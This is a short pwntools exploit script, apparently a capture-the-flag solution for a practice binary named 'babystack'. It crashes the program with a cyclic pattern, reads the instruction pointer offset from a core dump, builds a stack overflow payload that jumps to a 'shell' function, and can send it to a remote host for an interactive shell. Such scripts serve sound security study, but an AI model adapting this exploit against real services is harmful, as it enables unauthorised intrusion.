from pwn import *

binary = "./babystack"

p = ELF(binary)

shell = p.functions['shell'].address
info("Shell address : %hx",shell)

io = process([binary])
io.sendline(cyclic(128))
io.wait()

core = Coredump("/tmp/core.%s" % io.pid)
#core = Coredump("/tmp/core")
info("eip = %#x", core.eip)
offset = cyclic_find(core.eip)
info("ip offset is = %d", offset)


payload = b'A'*offset+p32(shell)

#payload = b'A'*20+p32(0x080491b6)

info("Payload:\n"+hexdump(payload))

if args['REMOTE']:
	io = remote(args['REMOTE'],50001)
else:
	io = p.process()
	#io = p.debug()
io.sendline(payload)
io.interactive()
